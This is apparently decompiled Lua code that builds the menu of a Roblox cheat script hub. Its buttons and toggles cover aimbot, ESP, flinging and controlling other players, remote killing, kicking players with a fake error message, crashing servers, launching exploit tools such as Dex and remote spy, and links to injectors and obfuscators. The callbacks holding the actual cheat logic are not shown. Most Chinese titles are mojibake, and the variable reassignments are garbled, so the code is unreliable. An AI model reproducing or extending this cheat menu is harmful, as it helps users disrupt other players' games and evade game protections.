Ffffff = Ffffff.Button
Ffffff(Element272, Element305)
Ffffff = Element241.SpeedTab
local Element306 = {}
Runservice4 = Element306
Element306.Title = "r6å¨ä½èæ¬"
Players = Job52
Element306.Callback = Job52
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element306)
Ffffff = Element241.SpeedTab
local Element307 = {}
Runservice4 = Element307
Element307.Title = "F3X gui"
Players = Job53
Element307.Callback = Job53
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element307)
Ffffff = Element241.SpeedTab
local Element308 = {}
Runservice4 = Element308
Element308.Title = "å°ç¾½F3X"
Players = Job54
Element308.Callback = Job54
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element308)
Ffffff = Element241.SpeedTab
local Element309 = {}
Runservice4 = Element309
Element309.Title = "åå»¶è¿èæ¬"
Players = Job55
Element309.Callback = Job55
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element309)
Ffffff = Element241.SpeedTab
local Element310 = {}
Runservice4 = Element310
Element310.Title = "é£è½¦"
Players = Job56
Element310.Callback = Job56
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element310)
Ffffff = Element241.SpeedTab
local Element311 = {}
Runservice4 = Element311
Element311.Title = "ç¥å½äºº"
Players = Job57
Element311.Callback = Job57
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element311)
Ffffff = Element241.SpeedTab
local Element312 = {}
Runservice4 = Element312
Element312.Title = "ç«è½¦å¤´"
Players = Job58
Element312.Callback = Job58
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element312)
Ffffff = Element241.SpeedTab
local Element313 = {}
Runservice4 = Element313
Element313.Title = "é è¿èªå¨æ»å»"
Element313.Desc = "éè¦æ¿èµ·æ­¦å¨"
Element313.Value = false
Players = Job59
Element313.Callback = Job59
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element313)
Ffffff = Element241.SpeedTab
local Element314 = {}
Runservice4 = Element314
Element314.Title = "è®©æ°è¿æ¥çç©å®¶åænoob"
Players = Job63
Element314.Callback = Job63
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element314)
Ffffff = Element241.SpeedTab
local Element315 = {}
Runservice4 = Element315
Element315.Title = "æ æå°ä¾ ç©é£"
Players = Job64
Element315.Callback = Job64
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element315)
Ffffff = Element241.SpeedTab
local Element316 = {}
Runservice4 = Element316
Element316.Title = "æ§å¶ç©å®¶"
Players = Job65
Element316.Callback = Job65
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element316)
Ffffff = Element241.SpeedTab
local Element317 = {}
Runservice4 = Element317
Element317.Title = "ä¿®æ¹é®ä½"
Players = Job66
Element317.Callback = Job66
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element317)
Ffffff = Element241.SpeedTab
local Element318 = {}
Runservice4 = Element318
Element318.Title = "åèç©º"
Element318.Value = false
Players = Job67
Element318.Callback = Job67
Element272 = Ffffff
Ffffff = Ffffff.Toggle
Ffffff(Element272, Element318)
Ffffff = Element241.SpeedTab
local Element319 = {}
Runservice4 = Element319
Element319.Title = "è§è§éå®"
Players = Job69
Element319.Callback = Job69
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element319)
Ffffff = Element241.SpeedTab
local Element320 = {}
Runservice4 = Element320
Element320.Title = "è¿åæ­»äº¡åçä½ç½®"
Players = Job70
Element320.Callback = Job70
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element320)
Ffffff = Element241.SpeedTab
local Element321 = {}
Runservice4 = Element321
Element321.Title = "éä½å»¶è¿åæåfps"
Players = Job71
Element321.Callback = Job71
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element321)
Ffffff = Element241.SpeedTab
local Element322 = {}
Runservice4 = Element322
Element322.Title = "é²èæ"
Players = Job72
Element322.Callback = Job72
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element322)
Ffffff = Element241.SpeedTab
local Element323 = {}
Runservice4 = Element323
Element323.Title = "è§è²çæ"
Players = Job73
Element323.Callback = Job73
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element323)
Ffffff = Element241.SpeedTab
local Element324 = {}
Runservice4 = Element324
Element324.Title = "â èªç"
Players = Job74
Element324.Callback = Job74
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element324)
Ffffff = Element241.SpeedTab
local Element325 = {}
Runservice4 = Element325
Element325.Title = "â¡ESP/èªç"
Players = Job75
Element325.Callback = Job75
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element325)
Ffffff = Element241.SpeedTab
local Element326 = {}
Runservice4 = Element326
Element326.Title = "å­å¼¹è¿½è¸ª"
Players = Job76
Element326.Callback = Job76
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element326)
Ffffff = Element241.SpeedTab
local Element327 = {}
Runservice4 = Element327
Element327.Title = "èªå®ä¹éåºåå "
Element327.Desc = "è¾å¥éåºæ¶æ¾ç¤ºçæå­"
Element327.Value = "ä½ å·²éåºæ¸¸æ"
Element327.Placeholder = "éè¯¯ä»£ç 277"
Players = Job77
Element327.Callback = Job77
Element272 = Ffffff
Ffffff = Ffffff.Input
Ffffff(Element272, Element327)
Ffffff = Element241.SpeedTab
local Element328 = {}
Runservice4 = Element328
Element328.Title = "è¸¢åº"
Element328.Desc = "ä»¥èªå®ä¹åå éåº"
Players = Job78
Element328.Callback = Job78
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element328)
Ffffff = Element241.SpeedTab
local Element329 = {}
Runservice4 = Element329
Element329.Title = "æäººèæ¬"
Players = Job79
Element329.Callback = Job79
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element329)
Ffffff = Element241.SpeedTab
local Element330 = {}
Runservice4 = Element330
Element330.Title = "NPCç©é£ç¬è®°"
Players = Job80
Element330.Callback = Job80
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element330)
Ffffff = Element241.SpeedTab
local Element331 = {}
Runservice4 = Element331
Element331.Title = "â¡"
Players = Job81
Element331.Callback = Job81
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element331)
Ffffff = Element241.SpeedTab
local Element332 = {}
Runservice4 = Element332
Element332.Title = "èªçNPC"
Players = Job82
Element332.Callback = Job82
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element332)
Ffffff = Element241.SpeedTab
local Element333 = {}
Runservice4 = Element333
Element333.Title = "â¢"
Players = Job83
Element333.Callback = Job83
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element333)
Ffffff = Element241.SpeedTab
local Element334 = {}
Runservice4 = Element334
Element334.Title = "æ§è¡Dex"
Players = Job84
Element334.Callback = Job84
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element334)
Ffffff = Element241.SpeedTab
local Element335 = {}
Runservice4 = Element335
Element335.Title = "æ§è¡rspy"
Players = Job85
Element335.Callback = Job85
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element335)
Ffffff = Element241.SpeedTab
local Element336 = {}
Runservice4 = Element336
Element336.Title = "æ§è¡Cspy"
Players = Job86
Element336.Callback = Job86
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element336)
Ffffff = Element241.SpeedTab
local Element337 = {}
Runservice4 = Element337
Element337.Title = "æ§è¡mdex"
Players = Job87
Element337.Callback = Job87
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element337)
Ffffff = Element241.SpeedTab
local Element338 = {}
Runservice4 = Element338
Element338.Title = "è·å¾AK47"
Players = Job88
Element338.Callback = Job88
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element338)
Ffffff = Element241.SpeedTab
local Element339 = {}
Runservice4 = Element339
Element339.Title = "æ£æ¨"
Element339.Icon = "lock"
Element339.Desc = "è¦114514åæä¹°å°"
Players = true
Element339.Locked = true
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element339)
Ffffff = Element241.SpeedTab
local Element340 = {}
Runservice4 = Element340
Element340.Title = "è¶ç»èæ¬æææå·é¨ä¸ç­é¨æå¡å¨"
Players = Job89
Element340.Callback = Job89
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element340)
Ffffff = Element241.SpeedTab
local Element341 = {}
Runservice4 = Element341
Element341.Title = "é·æ¬§é£è¸¢"
Players = Job90
Element341.Callback = Job90
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element341)
Ffffff = Element241.SpeedTab
local Element342 = {}
Runservice4 = Element342
Element342.Title = "éæ³"
Players = Job91
Element342.Callback = Job91
Element272 = Ffffff
Ffffff = Ffffff.Button
Ffffff(Element272, Element342)
Runservice4 = "RunService"
Ffffff = game:GetService("RunService")
Players = "Players"
Runservice4 = game
Runservice4 = game:GetService("Players").LocalPlayer
Players = false
Element93 = processItems6
SpeedTab3 = Element241.SpeedTab
local Element343 = {Title = "ç¢°å°å«äººå°±ç©é£", Desc = "ç©é£", Value = false}
Teleportservice = Job92
Element343.Callback = Job92
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Toggle
SpeedTab3(TeleportService, Element343)
SpeedTab3 = Element241.SpeedTab
local Element344 = {
Title = "ç¿»è¯",
Desc = "åå¼å¯ç¿»è¯åå è½½ä½ çèæ¬",
Value = false,
}
Teleportservice = Job94
Element344.Callback = Job94
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Toggle
SpeedTab3(TeleportService, Element344)
SpeedTab3 = Element241.SpeedTab
local Element345 = {Title = "ç¿»è¯éåº¦", Desc = "è°æ´ç¿»è¯"}
local Element346 = {}
Players = Element346
Element346.Min = 1
Element346.Default = 2
Dark = 5
Element346.Max = 5
Element345.Value = Element346
Teleportservice = Job102
Element345.Callback = Job102
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Slider
SpeedTab3(TeleportService, Element345)
SpeedTab3 = Element241.FETab
local Element347 = {Title = "096èæ¬(ä»ér6)"}
Teleportservice = Job103
Element347.Callback = Job103
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element347)
SpeedTab3 = Element241.FETab
local Element348 = {Title = "æµ·ç»µå®å®(éè¦é¥°å)"}
Teleportservice = Job104
Element348.Callback = Job104
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element348)
SpeedTab3 = Element241.FETab
local Element349 = {Title = "Tubers93"}
Teleportservice = Job105
Element349.Callback = Job105
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element349)
SpeedTab3 = Element241.FETab
local Element350 = {Title = "Coolkid"}
Teleportservice = Job106
Element350.Callback = Job106
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element350)
SpeedTab3 = Element241.FETab
local Element351 = {Title = "1x1x1x1"}
Teleportservice = Job107
Element351.Callback = Job107
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element351)
SpeedTab3 = Element241.FETab
local Element352 = {Title = "å¨ç»ä¸­å¿"}
Teleportservice = Job108
Element352.Callback = Job108
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element352)
SpeedTab3 = Element241.FETab
local Element353 = {Title = "åç©å®¶r6"}
Teleportservice = Job109
Element353.Callback = Job109
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element353)
SpeedTab3 = Element241.FETab
local Element354 = {Title = "å¦ä¸ç§å¨ç»"}
Teleportservice = Job110
Element354.Callback = Job110
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element354)
SpeedTab3 = Element241.FETab
local Element355 = {Title = "ä»¿vr"}
Teleportservice = Job111
Element355.Callback = Job111
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element355)
SpeedTab3 = Element241.FETab
local Element356 = {Title = "FEå¤§é¤"}
Teleportservice = Job112
Element356.Callback = Job112
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element356)
SpeedTab3 = Element241.FETab
local Element357 = {Title = "verity(éè¦æ¢¯å­æè½è¿è¡)"}
Teleportservice = Job113
Element357.Callback = Job113
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element357)
SpeedTab3 = Element241.FETab
local Element358 = {Title = "ä¸ç¥åfe"}
Teleportservice = Job114
Element358.Callback = Job114
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element358)
SpeedTab3 = Element241.FETab
local Element359 = {Title = "FEéç¨éèº«"}
Teleportservice = Job115
Element359.Callback = Job115
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element359)
SpeedTab3 = Element241.FETab
local Element360 = {Title = "è¢«éå¼è®¿å®¢(åªå¨æå¡å¨æ¯r15æè½è¿è¡)"}
Teleportservice = Job116
Element360.Callback = Job116
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element360)
SpeedTab3 = Element241.FETab
local Element361 = {Title = "FEå¤§è¿"}
Teleportservice = Job117
Element361.Callback = Job117
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element361)
SpeedTab3 = Element241.ScriptTab
local Element362 = {Title = "ç®èæ¬"}
Teleportservice = Job118
Element362.Callback = Job118
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element362)
SpeedTab3 = Element241.ScriptTab
local Element363 = {Title = "XK"}
Teleportservice = Job119
Element363.Callback = Job119
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element363)
SpeedTab3 = Element241.ScriptTab
local Element364 = {Title = "çªèæ¬ä¸­å¿"}
Teleportservice = Job120
Element364.Callback = Job120
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element364)
SpeedTab3 = Element241.ScriptTab
local Element365 = {Title = "çªèæ¬"}
Teleportservice = Job121
Element365.Callback = Job121
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element365)
SpeedTab3 = Element241.ScriptTab
local Element366 = {Title = "å¶èæ¬"}
Teleportservice = Job122
Element366.Callback = Job122
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element366)
SpeedTab3 = Element241.ScriptTab
local Element367 = {Title = "å¤èæ¬"}
Teleportservice = Job123
Element367.Callback = Job123
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element367)
SpeedTab3 = Element241.ScriptTab
local HttpService2 = {Title = "æäºèæ¬ä¸­å¿"}
Teleportservice = Job124
HttpService2.Callback = Job124
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, HttpService2)
SpeedTab3 = Element241.ScriptTab
local Element368 = {Title = "ROB"}
Teleportservice = Job125
Element368.Callback = Job125
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element368)
SpeedTab3 = Element241.ScriptTab
local Element369 = {Title = "é»ç½èæ¬"}
Teleportservice = Job126
Element369.Callback = Job126
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element369)
SpeedTab3 = Element241.ScriptTab
local Element370 = {Title = "å¤§å¸é©¬(V6)"}
Teleportservice = Job127
Element370.Callback = Job127
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element370)
SpeedTab3 = Element241.ScriptTab
local Element371 = {Title = "è½å¶ä¸­å¿"}
Teleportservice = Job128
Element371.Callback = Job128
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element371)
SpeedTab3 = Element241.ScriptTab
local Element372 = {Title = "æ²èæ¬"}
Teleportservice = Job129
Element372.Callback = Job129
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element372)
SpeedTab3 = Element241.ScriptTab
local Element373 = {Title = "XA"}
Teleportservice = Job130
Element373.Callback = Job130
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element373)
SpeedTab3 = Element241.ScriptTab
local Element374 = {Title = "å¯¼ç®¡èæ¬"}
Teleportservice = Job131
Element374.Callback = Job131
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element374)
SpeedTab3 = Element241.ScriptTab
local Element375 = {Title = "XKèæ¬ä¸­å¿"}
Teleportservice = Job132
Element375.Callback = Job132
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element375)
SpeedTab3 = Element241.ScriptTab
local Element376 = {Title = "BSèæ¬è½»éç"}
Teleportservice = Job133
Element376.Callback = Job133
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element376)
SpeedTab3 = Element241.ScriptTab
local Element377 = {Title = "RB"}
Teleportservice = Job134
Element377.Callback = Job134
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element377)
SpeedTab3 = Element241.ScriptTab
local Element378 = {Title = "æèæ¬"}
Teleportservice = Job135
Element378.Callback = Job135
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element378)
SpeedTab3 = Element241.UITab
local Element379 = {
Title = "è®¾ç½®èæ¯",
Desc = "è¾å¥ä½ çå¾çID",
Value = "",
Placeholder = "è¾å¥ rbxassetid:// å¾çID",
}
Teleportservice = Job136
Element379.Callback = Job136
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Input
SpeedTab3(TeleportService, Element379)
SpeedTab3 = Element241.UITab
local Element380 = {Title = "éæ©ä¸»é¢", Desc = "åæ¢UIä¸»é¢"}
local Element381 = {}
Players = Element381
Dark = "Dark"
Light = "Light"
Mocha = "Mocha"
Aqua = "Aqua"
Rose = "Rose"
Element381[1] = "Dark"
Element381[2] = "Light"
Element381[3] = "Mocha"
Element381[4] = "Aqua"
Element381[5] = "Rose"
Element380.Values = Element381
Element380.Value = "Dark"
Teleportservice = Job138
Element380.Callback = Job138
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Dropdown
SpeedTab3(TeleportService, Element380)
SpeedTab3 = Element241.UITab
local Element382 = {Title = "UIèæ¯å¾ç", Desc = "éæ©èæ¯å¾ç"}
local Element383 = {}
Players = Element383
Dark = "æ èæ¯"
Light = "å¹æ ¹"
Mocha = "ç«æ´è³æº"
Aqua = "æªäººåä¼rk"
Rose = "è¿·ä½ ä¸ç"
Element383[1] = "æ èæ¯"
Element383[2] = "å¹æ ¹"
Element383[3] = "ç«æ´è³æº"
Element383[4] = "æªäººåä¼rk"
Element383[5] = "è¿·ä½ ä¸ç"
Element382.Values = Element383
Element382.Value = "å¹æ ¹"
Teleportservice = Job139
Element382.Callback = Job139
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Dropdown
SpeedTab3(TeleportService, Element382)
SpeedTab3 = Element241.UITab
local Element384 = {Title = "çªå£éæåº¦", Desc = "è°èçªå£èæ¯éæåº¦"}
local Element385 = {}
Players = Element385
Element385.Min = 0
Element385.Max = 1
Dark = 0
Element385.Default = 0
Element384.Value = Element385
Element384.Step = 0.05
Teleportservice = Job141
Element384.Callback = Job141
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Slider
SpeedTab3(TeleportService, Element384)
SpeedTab3 = Element241.UITab
local Element386 = {Title = "å®å¨éæ"}
Teleportservice = Job142
Element386.Callback = Job142
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element386)
SpeedTab3 = Element241.UITab
local Element387 = {Title = "åéæ"}
Teleportservice = Job143
Element387.Callback = Job143
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element387)
SpeedTab3 = Element241.UITab
local Element388 = {Title = "æ¢å¤ä¸éæ"}
Teleportservice = Job144
Element388.Callback = Job144
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element388)
SpeedTab3 = Element241.serverTab
Teleportservice = "gb"
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Section
SpeedTab3(TeleportService, {Title = "gb"})
SpeedTab3 = Element241.serverTab
local Element389 = {Title = "ç»å¸å¤§é»ç"}
Teleportservice = Job145
Element389.Callback = Job145
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element389)
SpeedTab3 = Element241.serverTab
local Element390 = {Title = "æ³å¶(åè´¹ç)"}
Teleportservice = Job146
Element390.Callback = Job146
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element390)
SpeedTab3 = Element241.serverTab
local Element391 = {Title = "åå¢åæ£æµ"}
Teleportservice = Job147
Element391.Callback = Job147
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element391)
SpeedTab3 = Element241.serverTab
local Element392 = {Title = "æ¸é£"}
Teleportservice = Job148
Element392.Callback = Job148
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element392)
SpeedTab3 = Element241.serverTab
local Element393 = {Title = "GBå®³äººç²¾"}
Teleportservice = Job149
Element393.Callback = Job149
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element393)
SpeedTab3 = Element241.serverTab
local Element394 = {Title = "ç©é£"}
Teleportservice = Job150
Element394.Callback = Job150
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element394)
SpeedTab3 = Element241.serverTab
local Element395 = {Title = "ç»è¿é£è¡"}
Teleportservice = Job151
Element395.Callback = Job151
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element395)
SpeedTab3 = Element241.serverTab
Teleportservice = "çç±äººç"
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Section
SpeedTab3(TeleportService, {Title = "çç±äººç"})
SpeedTab3 = Element241.serverTab
local Element396 = {Title = "å é¤é¨"}
Teleportservice = Job152
Element396.Callback = Job152
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element396)
SpeedTab3 = Element241.serverTab
local Element397 = {Title = "çç±äººçâ "}
Teleportservice = Job153
Element397.Callback = Job153
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element397)
SpeedTab3 = Element241.serverTab
local Element398 = {Title = "çç±äººçâ¡"}
Teleportservice = Job154
Element398.Callback = Job154
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element398)
SpeedTab3 = Element241.serverTab
Teleportservice = "æå¼ºæåº"
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Section
SpeedTab3(TeleportService, {Title = "æå¼ºæåº"})
SpeedTab3 = Element241.serverTab
local Element399 = {Title = "vexonhubæå¼ºèæ¬ï¼éè¦è§£å¡ï¼"}
Teleportservice = Job155
Element399.Callback = Job155
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element399)
SpeedTab3 = Element241.serverTab
local Element400 = {Title = "TSBâ "}
Teleportservice = Job156
Element400.Callback = Job156
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element400)
SpeedTab3 = Element241.serverTab
local Element401 = {Title = "è·éå°ä¸"}
Teleportservice = Job157
Element401.Callback = Job157
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element401)
SpeedTab3 = Element241.serverTab
local Element402 = {Title = "è¿ç¨æäºº"}
Teleportservice = Job158
Element402.Callback = Job158
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element402)
SpeedTab3 = Element241.serverTab
local Element403 = {Title = "èªå¨å·äººå¤´"}
Teleportservice = Job159
Element403.Callback = Job159
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element403)
SpeedTab3 = Element241.serverTab
local Element404 = {Title = "èç©ºç§æ"}
Teleportservice = Job160
Element404.Callback = Job160
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element404)
SpeedTab3 = Element241.PicturequalityTab
local Element405 = {Title = "åå½±"}
Teleportservice = Job161
Element405.Callback = Job161
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element405)
SpeedTab3 = Element241.PicturequalityTab
local Element406 = {Title = "åå½±2"}
Teleportservice = Job162
Element406.Callback = Job162
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element406)
SpeedTab3 = Element241.ExecuteTab
local Element407 = {Title = "å¿èæ³¨å¥å¨"}
Teleportservice = Job163
Element407.Callback = Job163
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element407)
SpeedTab3 = Element241.ExecuteTab
local Element408 = {Title = "é¿å°å®æ¯æ³¨å¥å¨"}
Teleportservice = Job164
Element408.Callback = Job164
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Button
SpeedTab3(TeleportService, Element408)
SpeedTab3 = Element241.informationTab
local Element409 = {
Title = "ä½ è§å¾æè¿ä¸ªèæ¬å¶ä½çä¸éçè¯å°±å³æ³¨æå§",
Desc = "ä¿¡æ¯",
Image = "rbxassetid://71024334944141",
ImageSize = 50,
Thumbnail = "rbxassetid://90738680026244",
}
Teleportservice = 210
Element409.ThumbnailSize = 210
Players = {}
local Element410 = {
Title = "æ³å¶ä½çå°±å¤å¶QQç¾¤",
Variant = "Primary",
Icon = "copy",
Callback = callback2,
}
Dark = Element410
local Element411 = {
Title = "å¤å¶ä½èçåå­",
Variant = "Primary",
Icon = "copy",
Callback = callback3,
}
Light = Element411
local Element412 = {}
Aqua = Element412
Element412.Title = "æ£æ¨"
Element412.Variant = "Primary"
Element412.Icon = "copy"
Rose = Job165
Element412.Callback = Job165
Mocha = Element412
Players[1] = Element410
Players[2] = Element411
Players[3] = Element412
Teleportservice = Players
Element409.Buttons = Players
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Paragraph
SpeedTab3(TeleportService, Element409)
SpeedTab3 = Element241.informationTab
local Element413 = {
Title = "æ··æ·å¨ç½ç«",
Desc = "ä¿¡æ¯",
Image = "rbxassetid://71024334944141",
ImageSize = 50,
Thumbnail = "rbxassetid://132372937787351",
}
Teleportservice = 360
Element413.ThumbnailSize = 360
Players = {}
Dark = {
Title = "å¤å¶wearedevs.net",
Variant = "Primary",
Icon = "copy",
Callback = callback4,
}
Light = {
Title = "å¤å¶åè´¹Luraph",
Variant = "Primary",
Icon = "copy",
Callback = callback5,
}
local Element414 = {
Title = "å¤å¶Luraph",
Variant = "Primary",
Icon = "copy",
Callback = callback6,
}
Mocha = Element414
local Element415 = {
Title = "å¤å¶moonveil",
Variant = "Primary",
Icon = "copy",
Callback = callback7,
}
Aqua = Element415
local Element416 = {}
Players = Element416
Element416.Title = "å¤å¶goofyscator"
Element416.Variant = "Primary"
Element416.Icon = "copy"
Element147 = Job166
Element416.Callback = Job166
Rose = Element416
Players[1] = Dark
Players[2] = Light
Players[3] = Element414
Players[4] = Element415
Players[5] = Element416
Teleportservice = Players
Element413.Buttons = Players
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Paragraph
SpeedTab3(TeleportService, Element413)
SpeedTab3 = Element241.informationTab
local Element417 = {
Title = "åæ··æ·(dc)",
Desc = "ä¿¡æ¯",
Image = "rbxassetid://104348365371258",
ImageSize = 50,
Thumbnail = "rbxassetid://104348365371258",
}
Teleportservice = 360
Element417.ThumbnailSize = 360
local Element418 = {}
Players = Element418
local Element419 = {
Title = "å¤å¶Moonsec V3",
Variant = "Primary",
Icon = "copy",
Callback = callback8,
}
Dark = Element419
local Element420 = {}
Mocha = Element420
Element420.Title = "å¤å¶WeAreDabs"
Element420.Variant = "Primary"
Element420.Icon = "copy"
Aqua = Job167
Element420.Callback = Job167
Light = Element420
Element418[1] = Element419
Element418[2] = Element420
Teleportservice = Element418
Element417.Buttons = Element418
TeleportService = SpeedTab3
SpeedTab3 = SpeedTab3.Paragraph
SpeedTab3(TeleportService, Element417)
TeleportService = game
SpeedTab3 = game:GetService("HttpService")
Teleportservice = "TeleportService"
TeleportService = game:GetService("TeleportService")
Players = "Players"
Teleportservice = game
Teleportservice = game:GetService("Players").LocalPlayer
Players = Job168
Dark = processItems7
Light = processItems8
Mocha = performTask
Aqua = Element241.informationTab
local Element421 = {}
Players = Element421
